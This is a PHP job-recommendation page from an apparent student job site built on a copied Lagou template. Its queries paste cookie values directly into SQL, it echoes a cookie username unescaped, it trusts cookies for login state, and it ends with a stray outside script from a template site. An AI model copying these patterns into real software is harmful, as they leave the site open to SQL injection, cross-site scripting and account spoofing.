<!DOCTYPE HTML>
<html xmlns:wb="http://open.weibo.com/wb"><head>
</script><script type="text/javascript" async="" src="style/js/conversion.js"></script><script src="style/js/allmobilize.min.js" charset="utf-8" id="allmobilize"></script><style type="text/css"></style>
<meta content="no-siteapp" http-equiv="Cache-Control">
<link  media="handheld" rel="alternate">
<!-- end 云适配 -->
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>赚了吗-大学生求职就业网</title>

<meta content="QIQ6KC1oZ6" name="baidu-site-verification">

<!-- <div class="web_root"  style="display:none">http://www.lagou.com</div> -->
<script type="text/javascript">
var ctx = "http://www.lagou.com";
console.log(1);
</script>
<link rel="icon" href="style/images/topico.ico">
<link href="style/css/style.css" type="text/css" rel="stylesheet">
<link href="style/css/external.min.css" type="text/css" rel="stylesheet">
<link href="style/css/popup.css" type="text/css" rel="stylesheet">
<script type="text/javascript" src="style/js/jquery.1.10.1.min.js"></script>
<script src="style/js/jquery.lib.min.js" type="text/javascript"></script>
<script type="text/javascript" src="style/js/ajaxfileupload.js"></script>
<script src="style/js/additional-methods.js" type="text/javascript"></script>
<!--[if lte IE 8]>
    <script type="text/javascript" src="style/js/excanvas.js"></script>
<![endif]-->
<script type="text/javascript">
var youdao_conv_id = 271546; 
</script> 
<script src="style/js/conv.js" type="text/javascript"></script>
<script src="style/js/ajaxCross.json" charset="UTF-8"></script></head>
<body>
<div id="body">
	<div id="header">
    	<div class="wrapper">
<a href="index.php" class="logo">
    			<img src='style/images/logo1.png' width="207" height="52" alt="赚钱了大学生就业网站" />
    		</a>
            
            
            
            
            
            
            
    		<ul class="reset" id="navheader">
    			<li class="current"><a href="index.php">首页</a></li>
    			<li ><a href="companylist.php" >公司</a></li>
    			<li ><a href="xjh.php" rel="nofollow">宣讲会</a></li>
    			<li ><a href="guide.php" rel="nofollow">求职指导</a></li>
	    		    		</ul>
                            
                            
                            
                      <?php if(!isset($_COOKIE["user"])){   echo'<ul class="loginTop">
            	<li><a href="login.html" rel="nofollow">登录</a></li> 
            	<li>|</li>
            	<li><a href="register.html" rel="nofollow">注册</a></li>
            </ul> ';}   
                                            
                            
 else{  echo' <dl class="collapsible_menu">
            	<dt>
           			<span>
                     
  '.$_COOKIE["user"].'

&nbsp;</span> 
            		<span class="red dn" id="noticeDot-0"></span>
            		<i></i>
            	</dt>'; if(isset($_COOKIE["type"])){
					if($_COOKIE["type"]=="stu"){
                       echo'         	<dd><a rel="nofollow" href="jianli.php">我的简历</a></dd>
                	                	<dd><a href="myapply.php">我申请的职位</a></dd>
                	                	                	<dd class="btm"><a href="subscribe.php">我的推荐</a></dd><dd><a href="updatePwd.php">密码修改</a></dd><dd ><a rel="nofollow" href="exit.php">退出</a></dd>';}
															else{
                       echo'  
<dd style="display: none;"><a href="positions.php">我发布的职位</a></dd>
                	<dd style="display: none;"><a href="undeal.php">我收到的简历</a></dd>
                	<dd class="btm" style="display: none;"><a href="myhome.php">我的公司主页</a></d>
					<dd><a href="updatePwd.php">密码修改</a></dd><dd><a href="exit.php">退出</a></dd>';}}'
                                               
                                <dd ><a rel="nofollow" href="exit.php">退出</a></dd>
            </dl> ';}  ?>                             </div>
    </div><!-- end #header -->
    <div id="container">
        	  	
        <div class="clearfix">
            <div class="content_l">
            	
<?php 
include('conn.php');

$check="select * from expect where id='{$_COOKIE["id"]}'";

$result=mysqli_query($con, $check);

//$result2=mysqli_query($con, $sql2);

	 $row=mysqli_fetch_array($result);
		 $name=$row[1];
		 $city=$row[2];
		 $type=$row[3];
		 $position=$row[4];
		 $wage=$row[5];
	
		
		if(($row[1]=="")||($row[2]=="")||($row[3]=="")||($row[4]=="")||($row[5]=="")){echo '<h3>您的简历中没有填写期望工作</h3>
            	<a href="jianli.php#expect1" >请完善资料后再进行推荐工作</a>';}
else{$sql="select * from job where  jcity='{$city}' and jnature='{$type}' and (jname like '%{$position}%' or jtype like'%{$position}%')and jwage='{$wage}' ORDER BY jid DESC";
echo '<h3>根据您简历中的期望工作：'.$city.'-'.$type.'-'.$position.' '.$wage.'</h3>
            	<p>为您推荐了以下工作</p>';
$result2=mysqli_query($con, $sql);

//$result2=mysqli_query($con, $sql2);
while
	 ($row=mysqli_fetch_array($result2)){
		 $jid=$row[0];
		 $cid=$row[1];
	  $jtype= $row[2];
    $jname = $row[3];
	$jdepartment = $row[4];
	$jnature=$row[5];
	$jwage=$row[6];
    $jcity = $row[7];
	$jyear = $row[8];
	$jeducation=$row[9];
	$jadvantage=$row[10];
	$jdetail=$row[11];
	$jaddress=$row[12];
	$jemail=$row[13];
	$jtime=$row[14];
	$cname=$row[15];
echo'
<li class="odd clearfix">
			                			                				                	<div class="hot_pos_l">
			                        <div class="mb10">
			                            <a href="jobdetail.php?jid='.$jid.'" title="'.$jtype.'-'.$jname.'" target="_blank">'.$jtype.'-'.$jname.'</a> 
			                            &nbsp;
			                            <span class="c9">['.$jcity.']</span>
			                            			                        </div>
			                        <span><em class="c7">月薪：</em>'.$jwage.'</span>
			                        <span><em class="c7">经验：</em>'.$jyear.'</span>
			                        <span><em class="c7">最低学历： </em>'.$jeducation.'</span>
			                        <br />
			                        <span><em class="c7">职位诱惑：</em>'.$jadvantage.'</span>
			                        <br />
			                        <span>'.$jtime.'发布</span>
			                    </div> 
						        <div >
			                       
			                        <div class="mb10"><a href="h/c/1712.html" title="'.$cname.'" target="_blank">'.$cname.'</a></div>
			                        <span><em class="c7">类型： </em>'.$jnature.'</span>
			                        			                       
			                        			                        <br />
			                        <span><em class="c7">地址： </em>'.$jaddress.'</span>
			                       
			                        
			                    </div>
			                 </li> <hr>';}}?>
                	                	            
	           <!--  	                <a href="javascript:void(0)"  class="btn_big"  id="subBtn">新建订阅</a>
	                	                <div class="apply_num">共可创建 <span>2</span> 个，还可创建 <span>1</span> 个</div>
	                <input type="hidden" id="orderCount" value="1" />
	                -->
          		<input type="hidden" value="1" id="orderCount">
          	
                <form class="dn" id="subForm">
                	<input type="hidden" id="orderId" name="id" value="">
	                <div class="s_form">
	                	<p>筛选下面的职位订阅条件，实现精准匹配的个性化职位定制，我们帮你挑工作！</p>
	                    <dl>
	                    	<dt>
	                        	<h3>接收邮箱  <i class="rss_circle"></i>&nbsp; 发送周期 <em></em><span>（必填）</span></h3>
	                        </dt>
	                        <dd>
	                        	<input type="text" value="888888888@qq.com" placeholder="请输入接收邮箱" name="email" id="subEmail">	
	                        	<span style="display:none;" class="error" id="emailError">请输入接收邮箱</span>
	                        </dd>
	                        <dd>
	                        	<input type="hidden" value="" name="sendMailPer" id="select_day_hidden">
	                       		<ul class="s_radio clearfix">
	                       				                            		<li title="3">3天</li>
	                            		                            		<li title="7">7天</li>
	                            		                            </ul> 	
	                            <span style="display:none;" class="error" id="sendError">请选择发送周期</span>
	                        </dd>
	                    </dl>
	                    <dl>
	                    	<dt>
	                        	<h3>职位名称 <em></em><span>（必填）</span></h3>	
	                        </dt>
	                        <dd>
	                        	<input type="hidden" value="" name="positionName" id="select_job_hidden">
	                       		<input type="button" value="请选择职位名称" id="select_job" class="select">
	                       		
	                            <div class="dn" id="sub_box_job" style="display: none;">
	                            			                            	<dl>
		                                	<dt>技术</dt>
		                                    <dd>
		                                    	<ul class="reset job_main">
		                                            														<li>
			                                            	后端开发
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>Java</li>
													            													        		<li>C++</li>
													            													        		<li>PHP</li>
													            													        		<li>数据挖掘</li>
													            													        		<li>C</li>
													            													        		<li>C#</li>
													            													        		<li>.NET</li>
													            													        		<li>Hadoop</li>
													            													        		<li>Python</li>
													            													        		<li>Delphi</li>
													            													        		<li>VB</li>
													            													        		<li>Perl</li>
													            													        		<li>Ruby</li>
													            													        		<li>Node.js</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	移动开发
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>HTML5</li>
													            													        		<li>Android</li>
													            													        		<li>iOS</li>
													            													        		<li>WP</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	前端开发
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>web前端</li>
													            													        		<li>Flash</li>
													            													        		<li>html5</li>
													            													        		<li>JavaScript</li>
													            													        		<li>U3D</li>
													            													        		<li>COCOS2D-X</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	测试
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>测试工程师</li>
													            													        		<li>自动化测试</li>
													            													        		<li>功能测试</li>
													            													        		<li>性能测试</li>
													            													        		<li>测试开发</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	运维
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>运维工程师</li>
													            													        		<li>运维开发工程师</li>
													            													        		<li>网络工程师</li>
													            													        		<li>系统工程师</li>
													            													        		<li>IT支持</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	DBA
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>MySQL</li>
													            													        		<li>SQLServer</li>
													            													        		<li>Oracle</li>
													            													        		<li>DB2</li>
													            													        		<li>MongoDB</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	项目管理
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>项目经理</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	高端技术职位
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>技术经理</li>
													            													        		<li>技术总监</li>
													            													        		<li>测试经理</li>
													            													        		<li>架构师</li>
													            													        		<li>CTO</li>
													            													        		<li>运维总监</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            		                                        </ul>
		                                    </dd>
		                                </dl>
		                            		                            	<dl>
		                                	<dt>产品</dt>
		                                    <dd>
		                                    	<ul class="reset job_main">
		                                            														<li>
			                                            	产品经理
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>产品经理</li>
													            													        		<li>网页产品经理</li>
													            													        		<li>移动产品经理</li>
													            													        		<li>产品助理</li>
													            													        		<li>数据产品经理</li>
													            													        		<li>电商产品经理</li>
													            													        		<li>游戏策划</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	产品设计师
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>网页产品设计师</li>
													            													        		<li>无线产品设计师</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	高端产品职位
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>产品部经理</li>
													            													        		<li>产品总监</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            		                                        </ul>
		                                    </dd>
		                                </dl>
		                            		                            	<dl>
		                                	<dt>设计</dt>
		                                    <dd>
		                                    	<ul class="reset job_main">
		                                            														<li>
			                                            	视觉设计
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>视觉设计师</li>
													            													        		<li>网页设计师</li>
													            													        		<li>Flash设计师</li>
													            													        		<li>APP设计师</li>
													            													        		<li>UI设计师</li>
													            													        		<li>平面设计师</li>
													            													        		<li>美术设计师（2D/3D）</li>
													            													        		<li>广告设计师</li>
													            													        		<li>多媒体设计师</li>
													            													        		<li>原画师</li>
													            													        		<li>游戏特效</li>
													            													        		<li>游戏界面设计师</li>
													            													        		<li>游戏场景</li>
													            													        		<li>游戏角色</li>
													            													        		<li>游戏动作</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	交互设计
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>交互设计师</li>
													            													        		<li>无线交互设计师</li>
													            													        		<li>网页交互设计师</li>
													            													        		<li>硬件交互设计师</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	用户研究
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>数据分析师</li>
													            													        		<li>用户研究员</li>
													            													        		<li>游戏数值策划</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	高端设计职位
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>设计经理/主管</li>
													            													        		<li>设计总监</li>
													            													        		<li>视觉设计经理/主管</li>
													            													        		<li>视觉设计总监</li>
													            													        		<li>交互设计经理/主管</li>
													            													        		<li>交互设计总监</li>
													            													        		<li>用户研究经理/主管</li>
													            													        		<li>用户研究总监</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            		                                        </ul>
		                                    </dd>
		                                </dl>
		                            		                            	<dl>
		                                	<dt>运营</dt>
		                                    <dd>
		                                    	<ul class="reset job_main">
		                                            														<li>
			                                            	运营
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>用户运营</li>
													            													        		<li>产品运营</li>
													            													        		<li>数据运营</li>
													            													        		<li>内容运营</li>
													            													        		<li>活动运营</li>
													            													        		<li>商家运营</li>
													            													        		<li>品类运营</li>
													            													        		<li>游戏运营</li>
													            													        		<li>网络推广</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	编辑
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>副主编</li>
													            													        		<li>内容编辑</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	客服
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>售前咨询</li>
													            													        		<li>售后客服</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	高端运营职位
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>主编</li>
													            													        		<li>运营总监</li>
													            													        		<li>COO</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            		                                        </ul>
		                                    </dd>
		                                </dl>
		                            		                            	<dl>
		                                	<dt>市场与销售</dt>
		                                    <dd>
		                                    	<ul class="reset job_main">
		                                            														<li>
			                                            	市场/营销
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>市场营销</li>
													            													        		<li>市场策划</li>
													            													        		<li>市场顾问</li>
													            													        		<li>市场推广</li>
													            													        		<li>SEO</li>
													            													        		<li>SEM</li>
													            													        		<li>商务渠道</li>
													            													        		<li>商业数据分析</li>
													            													        		<li>活动策划</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	公关
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>媒介经理</li>
													            													        		<li>广告协调</li>
													            													        		<li>品牌公关</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	销售
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>销售专员</li>
													            													        		<li>销售经理</li>
													            													        		<li>客户代表</li>
													            													        		<li>大客户代表</li>
													            													        		<li>BD经理</li>
													            													        		<li>商务渠道</li>
													            													        		<li>渠道销售</li>
													            													        		<li>代理商销售</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	高端市场职位
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>市场总监</li>
													            													        		<li>销售总监</li>
													            													        		<li>商务总监</li>
													            													        		<li>CMO</li>
													            													        		<li>公关总监</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            		                                        </ul>
		                                    </dd>
		                                </dl>
		                            		                            	<dl>
		                                	<dt>职能</dt>
		                                    <dd>
		                                    	<ul class="reset job_main">
		                                            														<li>
			                                            	人力资源
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>人力资源</li>
													            													        		<li>招聘</li>
													            													        		<li>HRBP</li>
													            													        		<li>人事/HR</li>
													            													        		<li>培训经理</li>
													            													        		<li>薪资福利经理</li>
													            													        		<li>绩效考核经理</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	行政
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -164px;">
			                                            															        		<li>助理</li>
													            													        		<li>前台</li>
													            													        		<li>法务</li>
													            													        		<li>行政</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	财务
			                                            				                                            	<ul class="reset job_sub dn" style="margin-left: -320px;">
			                                            															        		<li>会计</li>
													            													        		<li>出纳</li>
													            													        		<li>财务</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            														<li>
			                                            	高端职能职位
			                                            				                                            	<ul class="reset job_sub dn">
			                                            															        		<li>行政总监/经理</li>
													            													        		<li>财务总监/经理</li>
													            													        		<li>HRD/HRM</li>
													            													        		<li>CFO</li>
													            			                                                </ul>
			                                                			                                            </li>
		                                            		                                        </ul>
		                                    </dd>
		                                </dl>
		                            	                            </div>
	                            <span style="display:none;" class="error" id="positionError">请选择职位名称 </span>		
	                        </dd>
	                    </dl>
	                    <dl>
	                    	<dt>
	                        	<h3>工作地点 <em></em><span>（必填）</span></h3>
	                        </dt>
	                        <dd>
	                        	<input type="hidden" value="" name="city" id="select_city_hidden">
	                            <ul class="s_radio clearfix">
	                            		                            			                            		<li title="北京">北京</li>
	                            			                            		                            			                            		<li title="上海">上海</li>
	                            			                            		                            			                            		<li title="广州">广州</li>
	                            			                            		                            			                            		<li title="深圳">深圳</li>
	                            			                            		                            			                            		<li title="成都">成都</li>
	                            			                            		                            			                            		<li title="杭州">杭州</li>
	                            			                            		                            </ul> 	
	                            <span style="display:none;" class="error" id="cityError">请选择工作地点 </span>	
	                        </dd>
	                    </dl>
	                    <dl>
	                    	<dt>
	                        	<h3>发展阶段 <em></em></h3>
	                        </dt>
	                        <dd>
	                        	<input type="hidden" value="" name="financeStage" id="select_stage_hidden">
	                        	<ul class="s_tips clearfix s_radio_sp">
	                            		                            		<li title="初创型">初创型<span class="dn">刚成立或已获得天使投资</span></li>
	                            		                            		<li title="成长型">成长型<span class="dn">已获得A轮/B轮/C轮融资</span></li>
	                            		                            		<li title="成熟型">成熟型<span class="dn">有D轮及以上的融资</span></li>
	                            		                            		<li title="上市公司">上市公司<span class="dn">上市公司</span></li>
	                            		                            </ul> 
	                            <span style="display:none;" class="error" id="stageError">请选择发展阶段 </span>		
	                        </dd>
	                    </dl>
	                    <dl>
	                    	<dt>
	                        	<h3>行业领域 <em></em></h3>
	                        </dt>
	                        <dd>
	                        	<input type="hidden" value="" name="industryField" id="select_industry_hidden">
	                            <input type="button" value="请选择行业领域" id="select_industry" class="select">
	                            <div class="dn" id="box_industry" style="display: none;">
	                            	<ul class="reset">
	                                		                                		<li>移动互联网</li>
	                                		                                		<li>电子商务</li>
	                                		                                		<li>社交</li>
	                                		                                		<li>企业服务</li>
	                                		                                		<li>O2O</li>
	                                		                                		<li>教育</li>
	                                		                                		<li>文化艺术</li>
	                                		                                		<li>游戏</li>
	                                		                                		<li>在线旅游</li>
	                                		                                		<li>金融互联网</li>
	                                		                                		<li>健康医疗</li>
	                                		                                		<li>生活服务</li>
	                                		                                		<li>硬件</li>
	                                		                                		<li>搜索</li>
	                                		                                		<li>安全</li>
	                                		                                		<li>运动体育</li>
	                                		                                		<li>云计算\大数据</li>
	                                		                                		<li>移动广告</li>
	                                		                                		<li>社会化营销</li>
	                                		                                		<li>视频多媒体</li>
	                                		                                		<li>媒体</li>
	                                		                                		<li>智能家居</li>
	                                		                                		<li>智能电视</li>
	                                		                                		<li>分类信息</li>
	                                		                                		<li>招聘</li>
	                                		                                </ul>
	                            </div>
	                            <span style="display:none;" class="error" id="fieldError">请选择行业领域 </span>	
	                        </dd>
	                    </dl>
	                    <dl>
	                    	<dt>
	                        	<h3>月薪范围 <em></em></h3>
	                        </dt>
	                        <dd>
	                        	<input type="hidden" value="" name="salary" id="select_salary_hidden">
	                            <input type="button" value="请选择月薪范围" id="select_salary" class="select">
	                            <div class="dn" id="box_salary" style="display: none;">
	                            	<ul class="reset">
	                                		                                		<li>2k以下</li>
	                                		                                		<li>2k-5k</li>
	                                		                                		<li>5k-10k</li>
	                                		                                		<li>10k-15k</li>
	                                		                                		<li>15k-25k</li>
	                                		                                		<li>25k-50k</li>
	                                		                                		<li>50k以上</li>
	                                		                                </ul>
	                            </div>
	                       		<!-- <div>
	                                <input type="text" name="salaryMin" id="salary_low" placeholder="最低月薪" /> 
	                                <span>k</span>
	                            </div>
	                       		<div>
	                                <input type="text" name="salaryMax" id="salary_high" placeholder="最高月薪" /> 
	                                <span>k</span>
	                            </div>
	                            <span>请输入整数，如：4</span> -->
	                            <span style="display:none;" class="error" id="salaryError">请选择月薪范围 </span>	
	                        </dd>
	                    </dl>
	                    <span style="display:none;" class="error" id="commonError">系统异常</span>
	                    <input type="submit" value="保 存" id="subSubmit" class="btn_big">
	                    <a class="btn_cancel" href="javascript:void(0)">取 消</a>
	                </div>
	        	</form>
            </div>	
            <div class="content_r">
            	<div class="subscribe_side mb20 c5">
                    <div class="why">我们为什么强烈推荐你                    </div>
                    <ul class="reset">
                   	  <li class="sub1">帮助你节省浏览和筛选时间，快速找到适合的职位信息。</li>
                    </ul>
                </div>
            </div>
       	</div>
      <input type="hidden" id="userid" name="userid" value="314873">

<!------------------------------------- 弹窗lightbox ----------------------------------------->
<div style="display:none;">	
	<!-- 
		登录帐号订阅成功
		1、已登录用户，且是自有用户，已验证，订阅职位<=1，提示订阅成功；接收邮箱默认为登录邮箱，可修改。
		2、已登录用户，但是第三方用户，订阅职位<=1，提示订阅成功；接收邮箱手动输入可修改。
		未登录帐号订阅成功 
		未登录用户，但填写的邮箱为已注册、已验证邮箱，且订阅职位<=1，订阅成功，点击确定显示登录框
	-->
		<div class="popup" id="subscribeSuccessLogined">
        	<h4>职位订阅成功！</h4>
        	<p>我们将定期发送订阅邮件至：<a>888888888@qq.com</a>，请注意查收。</p>
            <table width="100%">
            	<tbody><tr>
                	<td align="center"><a class="btn_s" href="subscribe.html">确&nbsp;定</a></td>
                </tr>
            </tbody></table>
        </div><!--/#subscribeSuccessLogined-->
   	
   	<!-- 
		未登录未注册帐号订阅成功
		提示注册框
	-->
		<div style="height:370px;" class="popup" id="subscribeSuccessRegister">
        	<h4>职位订阅成功！</h4>
        	<p>我们将定期发送订阅邮件至：<a><em></em></a>，请注意查收。</p>
        	<hr>
        	<p>现在只需设置密码就可成功注册拉勾，并可长期保存及管理订阅信息。</p>
        	<form id="registerPopForm">
	            <table width="100%">
	            	<tbody><tr>
	                	<td>注册邮箱 :</td>
	                	<td><em></em></td>
	                </tr>
	                <tr>
	                	<td valign="top">注册密码 :</td>
	                	<td>
	                		<input type="password" placeholder="请输入注册密码" id="psw" name="password" style="background-image: url(style/images/img/a6y3y0Wx5kbFHvGuXzkgf0xhKnPzA4UTyaTB8Ph8AvcHi3fnsrZ7Wore02YViqVOrRXXPhfqP8j6MYlawoAAAAASUVORK5CYII=quot); background-repeat: no-repeat; background-attachment: scroll; background-position: right center;">
	                		<span id="beError_register" style="display:none;" class="error"></span>
	                	</td>
	                </tr>
	                <tr>
	                	<td></td>
	                	<td>
	                		<label for="checkbox" class="fl">
	                			<input type="checkbox" class="checkbox valid" checked="" name="checkbox" id="checkbox">
	                			我已阅读并同意<a target="_blank" href="http://www.lagou.com/privacy.html">《拉勾用户协议》</a>
	                		</label>
	                	</td>
	                </tr>
	            	<tr>
	            		<td></td>
	                	<td>
	                		<input type="submit" value="注 册" class="btn_s">
	                	</td>
	                </tr>
	            </tbody></table>
	        </form>
        </div><!--/#subscribeSuccessRegister-->
        
     <!-- 
		未登录注册帐号订阅成功
		弹出框有登录按钮，提示登录
	-->
		<div class="popup" id="subscribeSuccessLogin">
        	<h4>职位订阅成功！</h4>
        	<p>我们将定期发送订阅邮件至：<a></a>，请注意查收。</p>
            <table width="100%">
            	<tbody><tr>
                	<td align="center"><a title="登录" class="btn inline cboxElement" href="#loginPop">登 录</a></td>
                </tr>
            </tbody></table>
        </div><!--/#subscribeSuccessLogin-->
		
     <!-- 登录框 -->
	<div style="height:240px;" class="popup" id="loginPop">
       	<form id="loginForm">
			<input type="text" placeholder="请输入登录邮箱地址" tabindex="1" name="email" id="email" style="background-image: url(style/images/img/0CQnd2Jos49xUAAAAASUVORK5CYII=quot); background-repeat: no-repeat; background-attachment: scroll; background-position: right center;">
			<input type="password" placeholder="请输入密码" tabindex="2" name="password" id="password" style="background-image: url(style/images/img/0CQnd2Jos49xUAAAAASUVORK5CYII=quot); background-repeat: no-repeat; background-attachment: scroll; background-position: right center;">
			<span id="beError" style="display:none;" class="error"></span>
		    <label for="remember" class="fl"><input type="checkbox" name="autoLogin" checked="checked" value="" id="remember"> 记住我</label>
		    <a target="_blank" class="fr" href="http://www.lagou.com/reset.html">忘记密码？</a>
		    <input type="submit" value="登 &nbsp; &nbsp; 录" id="submitLogin">
		</form>
		<div class="login_right">
			<div>还没有拉勾帐号？</div>
			<a class="registor_now" href="http://www.lagou.com/register.html">立即注册</a>
		    <div class="login_others">使用以下帐号直接登录:</div>
		    <a title="使用新浪微博帐号登录" class="icon_wb" target="_blank" href="http://www.lagou.com/ologin/auth/sina.html"></a>
		    <a title="使用腾讯QQ帐号登录" target="_blank" class="icon_qq" href="http://www.lagou.com/ologin/auth/qq.html"></a>
		</div>
    </div><!--/#loginPop-->
    
     <!--退订-->	
    <div class="popup" id="cancelSub">
       	<h4>确认要退订该订阅？</h4>
       	<table width="100%">
       		<tbody><tr>
       			<td align="center"><p>点击确认后你将不再收到拉勾为你提供的精准职位推送。</p></td>
       		</tr>
        	<tr>
            	<td align="center">
            		<input type="button" value="确认退订" id="confirmCancel" class="btn_s">
            		<a class="btn_s" href="javascript:void(0)">取消</a>
            	</td>
            </tr>
        </tbody></table>
    </div><!--/#cancelSub-->
</div>
<!------------------------------------- end ----------------------------------------->

<script src="style/js/sub.min.js"></script>
<!-- 退订 | 从邮箱进来订阅页  -->

<!-- 订阅成功弹出注册框 | 从邮箱进来订阅页  -->

<!-- 订阅成功弹出登录框 | 从邮箱进来订阅页  -->

<!-- 从激活页点换个邮箱进入订阅页 -->
			<div class="clear"></div>
			<input type="hidden" value="37509432fb9e453a815da48821b7bf01" id="resubmitToken">
	    	<a rel="nofollow" title="回到顶部" id="backtop"></a>
	    </div><!-- end #container -->
	</div><!-- end #body -->
	<div id="footer">
		<div class="wrapper">
			<a rel="nofollow" target="_blank" href="about.html">联系我们</a>
	    <a target="_blank" href="http://www.lagou.com/af/zhaopin.html">互联网公司导航</a></div>
	</div>

<script src="style/js/core.min.js" type="text/javascript"></script>
<script src="style/js/popup.min.js" type="text/javascript"></script>

<!--  -->

<script type="text/javascript">
$(function(){
	$('#noticeDot-1').hide();
	$('#noticeTip a.closeNT').click(function(){
		$(this).parent().hide();
	});
});
var index = Math.floor(Math.random() * 2);
var ipArray = new Array('42.62.79.226','42.62.79.227');
var url = "ws://" + ipArray[index] + ":18080/wsServlet?code=314873";
var CallCenter = {
		init:function(url){
			var _websocket = new WebSocket(url);
			_websocket.onopen = function(evt) {
				console.log("Connected to WebSocket server.");
			};
			_websocket.onclose = function(evt) {
				console.log("Disconnected");
			};
			_websocket.onmessage = function(evt) {
				//alert(evt.data);
				var notice = jQuery.parseJSON(evt.data);
				if(notice.status[0] == 0){
					$('#noticeDot-0').hide();
					$('#noticeTip').hide();
					$('#noticeNo').text('').show().parent('a').attr('href',ctx+'/mycenter/delivery.html');
					$('#noticeNoPage').text('').show().parent('a').attr('href',ctx+'/mycenter/delivery.html');
				}else{
					$('#noticeDot-0').show();
					$('#noticeTip strong').text(notice.status[0]);
					$('#noticeTip').show();
					$('#noticeNo').text('('+notice.status[0]+')').show().parent('a').attr('href',ctx+'/mycenter/delivery.html');
					$('#noticeNoPage').text(' ('+notice.status[0]+')').show().parent('a').attr('href',ctx+'/mycenter/delivery.html');
				}
				$('#noticeDot-1').hide();
			};
			_websocket.onerror = function(evt) {
				console.log('Error occured: ' + evt);
			};
		}
};
CallCenter.init(url);
</script>

<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div></body><script type="text/javascript" src="http://freemoban.com/js/a.js"></script> </html>